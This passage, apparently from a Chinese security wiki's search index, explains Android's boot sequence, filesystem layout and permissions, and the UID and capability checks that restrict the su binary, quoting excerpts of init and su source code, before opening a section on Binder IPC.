\u4ee3\u7801\uff0c\u6fc0\u6d3b\u4e2d\u65ad\u63a7\u5236\u5668\uff0c\u8bbe\u7f6e\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff0c\u5b9a\u4e49\u8c03\u5ea6\uff0c\u52a0\u8f7d\u9a71\u52a8\u7a0b\u5e8f\u548c\u6302\u8f7d\u6839\u6587\u4ef6\u7cfb\u7edf\u3002\u5f53\u5185\u5b58\u7ba1\u7406\u5355\u5143\u521d\u59cb\u5316\u65f6\uff0c\u7cfb\u7edf\u4e3a\u4f7f\u7528\u865a\u62df\u5185\u5b58\u4ee5\u53ca\u8fd0\u884c\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b[17]\u505a\u51c6\u5907\u3002\u5b9e\u9645\u4e0a\uff0c\u4ece\u8fd9\u4e00\u6b65\u5f00\u59cb\uff0c\u8be5\u8fc7\u7a0b\u5c31\u548c\u8fd0\u884c Linux \u7684\u53f0\u5f0f\u8ba1\u7b97\u673a\u4e0a\u53d1\u751f\u7684\u8fc7\u7a0b\u6ca1\u4ec0\u4e48\u533a\u522b\u4e86\u3002 \u7b2c\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b\u662f init \uff0c\u5b83\u662f Android \u4e2d\u6240\u6709\u8fdb\u7a0b\u7684\u7956\u5148\u3002 \u8be5\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4f4d\u4e8eAndroid \u6587\u4ef6\u7cfb\u7edf\u7684\u6839\u76ee\u5f55\u4e2d\u3002 \u6e05\u5355 3.1 \u5305\u542b\u6b64\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4e3b\u8981\u90e8\u5206\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c init \u4e8c\u8fdb\u5236\u8d1f\u8d23\u521b\u5efa\u6587\u4ef6\u7cfb\u7edf\u57fa\u672c\u6761\u76ee\uff087 \u5230 16 \u884c\uff09\u3002 \u4e4b\u540e\uff08\u7b2c 18 \u884c\uff09\uff0c\u7a0b\u5e8f\u89e3\u6790 init.rc \u914d\u7f6e\u6587\u4ef6\u5e76\u6267\u884c\u5176\u4e2d\u7684\u547d\u4ee4\u3002 1 int main ( int argc , char ** argv ) 2 { 3 ... 4 if ( ! strcmp ( basename ( argv [ 0 ] ), \"ueventd\" ) ) 5 return ueventd_main ( argc , argv ) ; 6 ... 7 mkdir ( \"/dev\" , 0755 ) ; 8 mkdir ( \"/proc\" , 0755 ) ; 9 mkdir ( \"/sys\" , 0755 ) ; 10 11 mount ( \"tmpfs\" , \"/dev\" , \"tmpfs\" , MS_NOSUID , \"mode=0755\" ) ; 12 mkdir ( \"/dev/pts\" , 0755 ) ; 13 mkdir ( \"/dev/socket\" , 0755 ) ; 14 mount ( \"devpts\" , \"/dev/pts\" , \"devpts\" , 0 , NULL ) ; 15 mount ( \"proc\" , \"/proc\" , \"proc\" , 0 , NULL ) ; 16 mount ( \"sysfs\" , \"/sys\" , \"sysfs\" , 0 , NULL ) ; 17 ... 18 init_parseconfig_file ( \"/init.rc\" ) ; 19 ... 20 } init.rc \u914d\u7f6e\u6587\u4ef6\u4f7f\u7528\u4e00\u79cd\u79f0\u4e3a Android Init Language \u7684\u8bed\u8a00\u7f16\u5199\uff0c\u4f4d\u4e8e\u6839\u76ee\u5f55\u4e0b\u3002 \u8fd9\u4e2a\u914d \u7f6e\u6587\u4ef6\u53ef\u4ee5\u88ab\u60f3\u8c61\u4e3a\u4e00\u4e2a\u52a8\u4f5c\u5217\u8868\uff08\u547d\u4ee4\u5e8f\u5217\uff09\uff0c\u5176\u6267\u884c\u7531\u9884\u5b9a\u4e49\u7684\u4e8b\u4ef6\u89e6\u53d1\u3002 \u4f8b\u5982\uff0c\u5728\u6e05 \u5355 3.2 \u4e2d\uff0c fs \uff08\u884c 1\uff09\u662f\u4e00\u4e2a\u89e6\u53d1\u5668\uff0c\u800c\u7b2c 4 - 7 \u884c\u4ee3\u8868\u52a8\u4f5c\u3002 \u5728 init.rc \u914d\u7f6e\u6587\u4ef6\u4e2d\u7f16\u5199 \u7684\u547d\u4ee4\u5b9a\u4e49\u7cfb\u7edf\u5168\u5c40\u53d8\u91cf\uff0c\u4e3a\u5185\u5b58\u7ba1\u7406\u8bbe\u7f6e\u57fa\u672c\u5185\u6838\u53c2\u6570\uff0c\u914d\u7f6e\u6587\u4ef6\u7cfb\u7edf\u7b49\u3002\u4ece\u5b89\u5168\u89d2\u5ea6\u6765 \u770b\uff0c\u66f4\u91cd\u8981\u7684\u662f\u5b83\u8fd8\u8d1f\u8d23\u57fa\u672c\u6587\u4ef6\u7cfb\u7edf\u7ed3\u6784\u7684\u521b\u5efa\uff0c\u5e76\u4e3a\u521b\u5efa\u7684\u8282\u70b9\u5206\u914d\u6240\u6709\u8005\u548c\u6587\u4ef6\u7cfb\u7edf \u6743\u9650 \u6b64\u5916\uff0c init \u7a0b\u5e8f\u8d1f\u8d23\u5728 Android \u4e2d\u542f\u52a8\u51e0\u4e2a\u57fa\u672c\u7684\u5b88\u62a4\u8fdb\u7a0b\u548c\u8fdb\u7a0b\uff08\u53c2\u89c1\u56fe 3.1 \u4e2d\u7684\u6b65\u9aa4 5\uff09\uff0c\u5176\u53c2\u6570\u4e5f\u5728 init.rc \u6587\u4ef6\u4e2d\u5b9a\u4e49\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5728 Linux \u4e2d\u6267\u884c\u7684\u8fdb\u7a0b\u4ee5\u4e0e\u7956\u5148\u76f8\u540c\u7684 \u6743\u9650\uff08\u5728\u76f8\u540c\u7684 UID\u4e0b\uff09\u8fd0\u884c\u3002 \u5728 Android \u4e2d\uff0c init \u4ee5 root \u6743\u9650\uff08 UID == 0 \uff09\u542f\u52a8\u3002 \u8fd9 \u610f\u5473\u7740\u6240\u6709\u540e\u4ee3\u8fdb\u7a0b\u5e94\u8be5\u4f7f\u7528\u76f8\u540c\u7684 UID \u8fd0\u884c\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u7279\u6743\u8fdb\u7a0b\u53ef\u4ee5\u5c06\u5176 UID \u6539\u53d8\u4e3a\u8f83 \u5c11\u7279\u6743\u7684\u8fdb\u7a0b\u3002 \u56e0\u6b64\uff0c init \u8fdb\u7a0b\u7684\u6240\u6709\u540e\u4ee3\u53ef\u4ee5\u4f7f\u7528\u8be5\u529f\u80fd\u6765\u6307\u5b9a\u6d3e\u751f\u8fdb\u7a0b\u7684 UID \u548c GID\uff08\u6240\u6709\u8005\u548c\u7ec4\u4e5f\u5728 init.rc \u6587\u4ef6\u4e2d\u5b9a\u4e49\uff09\u3002 \u7b2c\u4e00\u4e2a\u5b88\u62a4\u8fdb\u7a0b\u6d3e\u751f\u4e8e init \u8fdb\u7a0b\uff0c\u5b83\u662f ueventd \u5b88\u62a4\u8fdb\u7a0b\u3002 \u8fd9\u4e2a\u670d\u52a1\u8fd0\u884c\u81ea\u5df1\u7684 main \u51fd\u6570 \uff08\u53c2\u89c1\u6e05\u5355 3.1 \u4e2d\u7684\u7b2c 5 \u884c\uff09\uff0c\u5b83\u8bfb\u53d6 ueventd.rc \u548c ueventd.[device name].rc \u914d\u7f6e\u6587\u4ef6\uff0c \u5e76\u91cd\u653e\u6307\u5b9a\u7684\u5185\u6838 uevent_hotplug \u4e8b\u4ef6\u3002 \u8fd9\u4e9b\u4e8b\u4ef6\u8bbe\u7f6e\u4e86\u4e0d\u540c\u8bbe\u5907\u7684\u6240\u6709\u8005\u548c\u6743\u9650\uff08\u53c2\u89c1\u6e05 \u5355 3.3\uff09\u3002 \u4f8b\u5982\uff0c\u7b2c 5 \u884c\u663e\u793a\u4e86\u5982\u4f55\u8bbe\u7f6e\u6587\u4ef6\u7cfb\u7edf\u5bf9 / dev/cam \u8bbe\u5907\u7684\u6743\u9650\uff0c2.2 \u8282\u4e2d\u4f1a\u6d89\u53ca \u8fd9\u4e2a\u4f8b\u5b50\u3002 \u4e4b\u540e\uff0c\u5b88\u62a4\u8fdb\u7a0b\u7b49\u5f85\u76d1\u542c\u6240\u6709\u672a\u6765\u7684\u70ed\u63d2\u62d4\u4e8b\u4ef6\u3002 \u7531 init \u7a0b\u5e8f\u542f\u52a8\u7684\u6838\u5fc3\u670d\u52a1\u4e4b\u4e00\u662f servicemanager \uff08\u8bf7\u53c2\u9605\u56fe 3.1 \u4e2d\u7684\u6b65\u9aa4 5\uff09\u3002 \u6b64\u670d\u52a1\u5145 \u5f53\u5728 Android \u4e2d\u8fd0\u884c\u7684\u6240\u6709\u670d\u52a1\u7684\u7d22\u5f15\u3002 \u5b83\u5fc5\u987b\u5728\u65e9\u671f\u9636\u6bb5\u53ef\u7528\uff0c\u56e0\u4e3a\u4ee5\u540e\u542f\u52a8\u7684\u6240\u6709\u7cfb\u7edf \u670d\u52a1\u90fd\u5e94\u8be5\u6709\u53ef\u80fd\u6ce8\u518c\u81ea\u5df1\uff0c\u4ece\u800c\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u7684\u5176\u4f59\u90e8\u5206\u53ef\u89c1[19]\u3002 init \u8fdb\u7a0b\u542f\u52a8\u7684\u53e6\u4e00\u4e2a\u6838\u5fc3\u8fdb\u7a0b\u662f Zygote\u3002 Zygote \u662f\u4e00\u4e2a\u70ed\u8eab\u5b8c\u6bd5\u7684\u7279\u6b8a\u8fdb\u7a0b\u3002 \u8fd9\u610f\u5473\u7740 \u8be5\u8fdb\u7a0b\u5df2\u7ecf\u88ab\u521d\u59cb\u5316\u5e76\u4e14\u94fe\u63a5\u5230\u6838\u5fc3\u5e93\u3002 Zygote \u662f\u6240\u6709\u8fdb\u7a0b\u7684\u7956\u5148\u3002 \u5f53\u4e00\u4e2a\u65b0\u7684\u5e94\u7528\u542f\u52a8 \u65f6\uff0cZygote \u4f1a\u6d3e\u751f\u81ea\u5df1\u3002 \u4e4b\u540e\uff0c\u4e3a\u6d3e\u751f\u5b50\u8fdb\u7a0b\u8bbe\u7f6e\u5bf9\u5e94\u4e8e\u65b0\u5e94\u7528\u7684\u53c2\u6570\uff0c\u4f8b\u5982 UID\uff0c GID\uff0c nice-name \u7b49\u3002 \u5b83\u80fd\u591f\u52a0\u901f\u65b0\u8fdb\u7a0b\u7684\u521b\u5efa\uff0c\u56e0\u4e3a\u4e0d\u9700\u8981\u5c06\u6838\u5fc3\u5e93\u590d\u5236\u5230\u65b0\u8fdb\u7a0b\u4e2d\u3002 \u65b0 \u8fdb\u7a0b\u7684\u5185\u5b58\u5177\u6709\u201c\u5199\u65f6\u590d\u5236\"\uff08COW\uff09\u4fdd\u62a4\uff0c\u8fd9\u610f\u5473\u7740\u53ea\u6709\u5f53\u540e\u8005\u5c1d\u8bd5\u5199\u5165\u53d7\u4fdd\u62a4\u7684\u5185\u5b58\u65f6\uff0c \u6570\u636e\u624d\u4f1a\u4ece zygote \u8fdb\u7a0b\u590d\u5236\u5230\u65b0\u8fdb\u7a0b\u3002 \u4ece\u800c\uff0c\u6838\u5fc3\u5e93\u4e0d\u4f1a\u6539\u53d8\uff0c\u5b83\u4eec\u53ea\u4fdd\u7559\u5728\u4e00\u4e2a\u5730\u65b9\uff0c\u51cf \u5c11\u5185\u5b58\u6d88\u8017\u548c\u5e94\u7528\u542f\u52a8\u65f6\u95f4\u3002 \u4f7f\u7528 Zygote \u8fd0\u884c\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\u662f System Server\uff08\u56fe 3.1 \u4e2d\u7684\u6b65\u9aa4 6\uff09\u3002 \u8fd9\u4e2a\u8fdb\u7a0b\u9996\u5148\u8fd0\u884c \u672c\u5730\u670d\u52a1\uff0c\u4f8b\u5982 SurfaceFlinger \u548c SensorService\u3002 \u5728\u670d\u52a1\u521d\u59cb\u5316\u4e4b\u540e\uff0c\u8c03\u7528\u56de\u8c03\uff0c\u542f\u52a8\u5269 \u4f59\u7684\u670d\u52a1\u3002 \u6240\u6709\u8fd9\u4e9b\u670d\u52a1\u4e4b\u540e\u4f7f\u7528 servicemanager \u6ce8\u518c\u3002","title":"3.1 Android \u5f15\u5bfc\u8fc7\u7a0b"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#32-android","text":"\u867d\u7136 Android \u57fa\u4e8e Linux \u5185\u6838\uff0c\u5b83\u7684\u6587\u4ef6\u7cfb\u7edf\u5c42\u6b21\u4e0d\u7b26\u5408\u6587\u4ef6\u7cfb\u7edf\u5c42\u6b21\u6807\u51c6[10]\uff0c\u5b83\u4e86\u5b9a\u4e49\u7c7b Unix \u7cfb\u7edf\u7684\u6587\u4ef6\u7cfb\u7edf\u5e03\u5c40\uff08\u89c1\u6e05\u5355 3.4\uff09\u3002 Android \u548c Linux \u4e2d\u7684\u67d0\u4e9b\u76ee\u5f55\u662f\u76f8\u540c\u7684\uff0c\u4f8b \u5982 /dev \uff0c /proc \uff0c /sys \uff0c /etc \uff0c /mnt \u7b49\u3002\u8fd9\u4e9b\u6587\u4ef6\u5939\u7684\u7528\u9014\u4e0e Linux \u4e2d\u7684\u76f8\u540c\u3002 \u540c \u65f6\uff0c\u8fd8\u6709\u4e00\u4e9b\u76ee\u5f55\uff0c\u5982 /system \uff0c /data \u548c /cache \uff0c\u5b83\u4eec\u4e0d\u5b58\u5728\u4e8e Linux \u7cfb\u7edf\u4e2d\u3002\u8fd9\u4e9b\u6587\u4ef6 \u5939\u662f Android \u7684\u6838\u5fc3\u90e8\u5206\u3002 \u5728 Android \u64cd\u4f5c\u7cfb\u7edf\u7684\u6784\u5efa\u671f\u95f4\uff0c\u4f1a\u521b\u5efa\u4e09\u4e2a\u6620\u50cf\u6587 \u4ef6\uff1a system.img \uff0c userdata.img \u548c cache.img \u3002 \u8fd9\u4e9b\u6620\u50cf\u63d0\u4f9b Android \u7684\u6838\u5fc3\u529f\u80fd\uff0c\u662f\u5728\u8bbe \u5907\u7684\u95ea\u5b58\u4e0a\u5b58\u50a8\u7684\u3002 \u5728\u7cfb\u7edf\u5f15\u5bfc\u671f\u95f4\uff0c init \u7a0b\u5e8f\u5c06\u8fd9\u4e9b\u6620\u50cf\u5b89\u88c5\u5230\u9884\u5b9a\u4e49\u7684\u5b89\u88c5\u70b9\uff0c \u5982 /system \uff0c /data \u548c /cache /system \u5206\u533a\u5305\u542b\u6574\u4e2a Android \u64cd\u4f5c\u7cfb\u7edf\uff0c\u9664\u4e86 Linux \u5185\u6838\uff0c\u5b83\u672c\u8eab\u4f4d\u4e8e /boot \u5206\u533a\u4e0a\u3002 \u6b64 \u6587\u4ef6\u5939\u5305\u542b\u5b50\u76ee\u5f55 /system/bin \u548c /system/lib \uff0c\u5b83\u4eec\u76f8\u5e94\u5305\u542b\u6838\u5fc3\u672c\u5730\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab \u5e93\u3002 \u6b64\u5916\uff0c\u6b64\u5206\u533a\u5305\u542b\u7531\u7cfb\u7edf\u6620\u50cf\u9884\u5148\u6784\u5efa\u7684\u6240\u6709\u7cfb\u7edf\u5e94\u7528\u3002 \u6620\u50cf\u4ee5\u53ea\u8bfb\u6a21\u5f0f\u5b89\u88c5\uff08\u53c2\u89c1\u6e05 \u5355 3.2 \u4e2d\u7684\u7b2c 5 \u884c\uff09\u3002 \u56e0\u6b64\uff0c\u6b64\u5206\u533a\u7684\u5185\u5bb9\u4e0d\u80fd\u5728\u8fd0\u884c\u65f6\u66f4\u6539\u3002 \u56e0\u6b64\uff0c /system \u5206\u533a\u88ab\u6302\u8f7d\u4e3a\u53ea\u8bfb\uff0c\u5b83\u4e0d\u80fd\u7528\u4e8e\u5b58\u50a8\u6570\u636e\u3002 \u4e3a\u6b64\uff0c\u5355\u72ec\u7684\u5206\u533a /data \u8d1f\u8d23\u5b58 \u50a8\u968f\u65f6\u95f4\u6539\u53d8\u7684\u7528\u6237\u6570\u636e\u6216\u4fe1\u606f\u3002 \u4f8b\u5982\uff0c /data/app \u76ee\u5f55\u5305\u542b\u5df2\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u6240\u6709 apk \u6587 \u4ef6\uff0c\u800c /data/data \u6587\u4ef6\u5939\u5305\u542b\u5e94\u7528\u7a0b\u5e8f\u7684 home \u76ee\u5f55\u3002 /cache \u5206\u533a\u8d1f\u8d23\u5b58\u50a8\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\u548c\u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6\u3002 \u6b64\u5916\uff0c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u7ebf\u66f4\u65b0\uff08\u5361\u5237\uff09\u4e5f \u5728\u8fd0\u884c\u4e4b\u524d\u5b58\u50a8\u5728\u6b64\u5206\u533a\u4e0a\u3002 \u56e0\u6b64\uff0c\u5728 Android \u7684\u7f16\u8bd1\u671f\u95f4\u751f\u6210 /system \uff0c /data \u548c /cache \uff0c\u8fd9\u4e9b\u6620\u50cf\u4e0a\u5305\u542b\u7684\u6587\u4ef6\u548c\u6587 \u4ef6\u5939\u7684\u9ed8\u8ba4\u6743\u9650\u548c\u6240\u6709\u8005\u5fc5\u987b\u5728\u7f16\u8bd1\u65f6\u5b9a\u4e49\u3002 \u8fd9\u610f\u5473\u7740\u5728\u7f16\u8bd1\u6b64\u64cd\u4f5c\u7cfb\u7edf\u671f\u95f4\uff0c\u7528\u6237\u548c\u7ec4 UID \u548c GID \u5e94\u8be5\u53ef\u7528\u3002 Android \u6587\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\uff08\u89c1\u6e05\u5355 3.5\uff09\u5305\u542b\u9884\u5b9a\u4e49\u7684\u7528\u6237\u548c\u7ec4\u7684 \u5217\u8868\u3002 \u5e94\u8be5\u63d0\u5230\u7684\u662f\uff0c\u4e00\u4e9b\u884c\u4e2d\u7684\u503c\uff08\u4f8b\u5982\uff0c\u53c2\u89c1\u7b2c 10 \u884c\uff09\u5bf9\u5e94\u4e8e\u5728 Linux \u5185\u6838\u5c42\u4e0a\u5b9a\u4e49\u7684 \u503c\uff0c\u5982\u7b2c 2.2 \u8282\u6240\u8ff0\u3002 \u6b64\u5916\uff0c\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u9ed8\u8ba4\u6743\u9650\uff0c\u6240\u6709\u8005\u548c\u6240\u6709\u8005\u7ec4\u5b9a\u4e49\u5728\u8be5\u6587\u4ef6\u4e2d\uff08\u89c1\u6e05\u5355 3.6\uff09\u3002 \u8fd9\u4e9b \u89c4\u5219\u7531 fs_config() \u51fd\u6570\u89e3\u6790\u5e76\u5e94\u7528\uff0c\u5b83\u5728\u8fd9\u4e2a\u6587\u4ef6\u7684\u672b\u5c3e\u5b9a\u4e49\u3002 \u6b64\u51fd\u6570\u5728\u6620\u50cf\u7ec4\u88c5\u671f\u95f4\u8c03 \u7528\u3002","title":"3.2 Android \u6587\u4ef6\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#321","text":"\u5728\u6e05\u5355 3.6 \u4e2d\u53ef\u4ee5\u770b\u5230\u4e00\u4e9b\u4e8c\u8fdb\u5236\u6587\u4ef6\u5206\u914d\u6709 setuid \u548c setgid \u8bbf\u95ee\u6743\u9650\u6807\u5fd7\u3002\u4f8b\u5982\uff0c su \u7a0b \u5e8f\u8bbe\u7f6e\u4e86\u5b83\u4eec\u3002\u8fd9\u4e2a\u4f17\u6240\u5468\u77e5\u7684\u5de5\u5177\u5141\u8bb8\u7528\u6237\u8fd0\u884c\u5177\u6709\u6307\u5b9a\u7684 UID \u548c GID \u7684\u7a0b\u5e8f\u3002\u5728 Linux \u4e2d\uff0c\u6b64\u529f\u80fd\u901a\u5e38\u7528\u4e8e\u8fd0\u884c\u5177\u6709\u8d85\u7ea7\u7528\u6237\u6743\u9650\u7684\u7a0b\u5e8f\u3002\u6839\u636e\u5217\u8868 3.6\uff0c\u4e8c\u8fdb \u5236 /system/xbin/su \u7684\u8bbf\u95ee\u6743\u9650\u5206\u914d\u4e3a\u201c06755\"\uff08\u89c1\u7b2c 21 \u884c\uff09\u3002\u7b2c\u4e00\u4e2a\u975e\u96f6\u6570\u201c6\"\u610f\u5473\u7740\u8be5\u4e8c \u8fdb\u5236\u5177\u6709 setuid \u548c setgid \uff08 4 + 2 \uff09\u8bbf\u95ee\u6743\u9650\u6807\u5fd7\u96c6\u3002\u901a\u5e38\uff0c\u5728Linux\u4e2d\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u4e0e \u542f\u52a8\u5b83\u7684\u8fdb\u7a0b\u76f8\u540c\u7684\u6743\u9650\u8fd0\u884c\u3002\u8fd9\u4e9b\u6807\u7b7e\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u53ef\u6267\u884c\u6240\u6709\u8005\u6216\u7ec4\u7684\u6743\u9650\u8fd0\u884c\u7a0b\u5e8f [11]\u3002\u56e0\u6b64\uff0c\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\uff0c binary/system/xbin/su \u5c06\u4ee5 root \u7528\u6237\u8eab\u4efd\u8fd0\u884c\u3002\u8fd9\u4e9b root \u6743 \u9650\u5141\u8bb8\u7a0b\u5e8f\u5c06\u5176 UID \u548c GID \u66f4\u6539\u4e3a\u7528\u6237\u6307\u5b9a\u7684 UID \u548c GID\uff08\u89c1\u6e05\u5355 3.7 \u4e2d\u7684\u7b2c 15 \u884c\uff09\u3002\u4e4b \u540e\uff0c su \u53ef\u4ee5\u4f7f\u7528\u6307\u5b9a\u7684 UID \u548c GID \u542f\u52a8\u63d0\u4f9b\u7684\u7a0b\u5e8f\uff08\u4f8b\u5982\uff0c\u53c2\u89c1\u884c 22\uff09\u3002\u56e0\u6b64\uff0c\u7a0b\u5e8f\u5c06\u4ee5 \u6240\u9700\u7684 UID \u548c GID \u542f\u52a8\u3002 \u5728\u7279\u6743\u7a0b\u5e8f\u7684\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u9650\u5236\u53ef\u8bbf\u95ee\u8fd9\u4e9b\u5de5\u5177\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u8303\u56f4\u3002 \u5728\u6211\u4eec\u7684\u8fd9\u91cc\uff0c\u6ca1\u6709\u8fd9 \u6837\u7684\u9650\u5236\uff0c\u4efb\u4f55\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u8fd0\u884c su \u7a0b\u5e8f\u5e76\u83b7\u5f97 root \u7ea7\u522b\u7684\u6743\u9650\u3002 \u5728 Android \u4e2d\uff0c\u901a\u8fc7\u5c06 \u8c03\u7528\u7a0b\u5e8f\u7684 UID \u4e0e\u5141\u8bb8\u8fd0\u884c\u5b83\u7684 UID \u5217\u8868\u8fdb\u884c\u6bd4\u8f83\uff0c\u6765\u5bf9\u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42\u5b9e\u73b0\u8fd9\u79cd\u9650\u5236\u3002 \u56e0 \u6b64\uff0c\u5728\u7b2c 9 \u884c\u4e2d\uff0c su \u53ef\u6267\u884c\u6587\u4ef6\u83b7\u5f97\u8fdb\u7a0b\u7684\u5f53\u524d UID\uff0c\u5b83\u7b49\u4e8e\u8c03\u7528\u5b83\u7684\u8fdb\u7a0b\u7684 UID\uff0c\u5728 \u7b2c 10 \u884c\uff0c\u5b83\u5c06\u8fd9\u4e2a UID \u4e0e\u5141\u8bb8\u7684 UID \u7684\u9884\u5b9a\u5217\u8868\u8fdb\u884c\u6bd4\u8f83\u3002 \u56e0\u6b64\uff0c\u53ea\u6709\u5728\u8c03\u7528\u8fdb\u7a0b\u7684 UID \u7b49\u4e8e AID_ROOT \u6216 AID_SHELL \u65f6\uff0c su \u5de5\u5177\u624d\u4f1a\u542f\u52a8\u3002 \u4e3a\u4e86\u6267\u884c\u8fd9\u6837\u7684\u68c0\u67e5\uff0c su \u5bfc\u5165\u5728 Android \u4e2d\u5b9a\u4e49\u7684 UID \u5e38\u91cf \u6b64\u5916\uff0c\u5728\u8f83\u65b0\u7684\u7248\u672c\uff08\u4ece 4.3 \u5f00\u59cb\uff09\uff0cAndroid \u6838\u5fc3\u5f00\u53d1\u4eba\u5458\u5f00\u59cb\u4f7f\u7528 Capabilities Linux \u5185 \u6838\u7cfb\u7edf[4]\u3002 \u8fd9\u5141\u8bb8\u5b83\u4eec\u989d\u5916\u9650\u5236\u9700\u8981\u4ee5 root \u6743\u9650\u8fd0\u884c\u7684\u7a0b\u5e8f\u7684\u6743\u9650\u3002 \u4f8b\u5982\uff0c\u5bf9\u4e8e su \u7a0b\u5e8f\u6765 \u8bf4\uff0c\u5b83\u4e0d\u9700\u8981\u5177\u6709 root \u7528\u6237\u7684\u6240\u6709\u7279\u6743\u3002 \u5bf9\u4e8e\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u5b83\u8db3\u4ee5\u6709\u80fd\u529b\u4fee\u6539\u5f53\u524d\u7684 UID \u548c GID\u3002 \u56e0\u6b64\uff0c\u6b64\u5de5\u5177\u53ea\u9700\u8981 CAP_SETUID \u548c CAP_SETGID root \u6743\u9650\u6765\u6b63\u5e38\u8fd0\u884c\u3002 1 # include < private / android_filesystem_config . h > 2 ... 3 int main ( int argc , char ** argv ) 4 { 5 struct passwd * pw ; 6 int uid , gid , myuid ; 7 8 /* Until we have something better , only root and the shell can use su . */ 9 myuid = getuid () ; 10 if ( myuid != AID_ROOT && myuid != AID_SHELL ) { 11 fprintf ( stderr , \"su : uid %d not allowed to su \\n \" , myuid ) ; 12 return 1 ; 13 } 14 ... 15 if ( setgid ( gid ) || setuid ( uid ) ) { 16 fprintf ( stderr , \"su : permission denied \\n \" ) ; 17 return 1 ; 18 } 19 20 /* User specified command for exec . */ 21 if ( argc == 3 ) { 22 if ( execlp ( argv [ 2 ], argv [ 2 ], NULL ) < 0 ) { 23 fprintf ( stderr , \"su : exec failed for %s Error:%s \\n \" , argv [ 2 ] , 24 strerror ( errno ) ) ; 25 return \u2212 errno ; 26 } 27 ... 28 } su \u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801","title":"3.2.1 \u672c\u5730\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4fdd\u62a4"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#android_2","text":"","title":"\u7b2c\u56db\u7ae0 Android \u6846\u67b6\u5c42\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#41-android-binder","text":"\u5982 2.1 \u8282\u6240\u8ff0\uff0c\u6240\u6709 Android \u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u5e94\u7528\u7a0b\u5e8f\u6c99\u7bb1\u4e2d\u8fd0\u884c\u3002\u7c97\u7565\u5730\u8bf4\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u6c99\u7bb1\u901a\u8fc7\u5728\u5e26\u6709\u4e0d\u540c Linux \u8eab\u4efd\u7684\u4e0d\u540c\u8fdb\u7a0b\u4e2d\u8fd0\u884c\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u6765\u4fdd\u8bc1\u3002\u6b64\u5916\uff0c\u7cfb\u7edf\u670d\u52a1\u4e5f\u5728\u5177\u6709\u66f4\u591a\u7279\u6743\u8eab\u4efd\u7684\u5355\u72ec\u8fdb\u7a0b\u4e2d\u8fd0\u884c\uff0c\u5141\u8bb8\u5b83\u4eec\u4f7f\u7528 Linux Kernel DAC \u529f\u80fd\uff0c\u8bbf\u95ee\u53d7\u4fdd\u62a4\u7cfb\u7edf\u4e0d\u540c\u90e8\u5206\uff08\u53c2\u89c1\u7b2c 2.1, 2.2 \u548c 1.2 \u8282\uff09\u3002\u56e0\u6b64\uff0c\u9700\u8981\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\u6846\u67b6\u6765\u7ba1\u7406\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u7684\u6570\u636e\u548c\u4fe1\u53f7\u4ea4\u6362\u3002\u5728 Android \u4e2d\uff0c\u4e00\u4e2a\u79f0\u4e3a Binder \u7684\u7279\u6b8a\u6846\u67b6\u7528\u4e8e\u8fdb\u7a0b\u95f4\u901a\u4fe1 [12]\u3002\u6807\u51c6\u7684 Posix System V IPC \u6846\u67b6\u4e0d\u652f\u6301\u7531 Android \u5b9e\u73b0\u7684 Bionic libc \u5e93\uff08\u53c2\u89c1\u8fd9\u91cc\uff09\u3002\u6b64\u5916\uff0c\u9664\u4e86\u7528\u4e8e\u4e00\u4e9b\u7279\u6b8a\u60c5\u51b5\u7684 Binder \u6846\u67b6\uff0c\u4e5f\u4f1a\u4f7f\u7528 Unix \u57df\u5957\u63a5\u5b57\uff08\u4f8b\u5982\uff0c\u7528\u4e8e\u4e0e Zygote \u5b88\u62a4\u8fdb\u7a0b\u7684\u901a\u4fe1\uff09\uff0c\u4f46\u662f\u8fd9\u4e9b\u673a\u5236\u4e0d\u5728\u672c\u6587\u7684\u8003\u8651\u8303\u56f4\u4e4b\u5185\u3002 Binder \u6846\u67b6\u88ab\u7279\u5730\u91cd\u65b0\u5f00\u53d1\u6765\u5728 Android \u4e2d\u4f7f\u7528\u3002 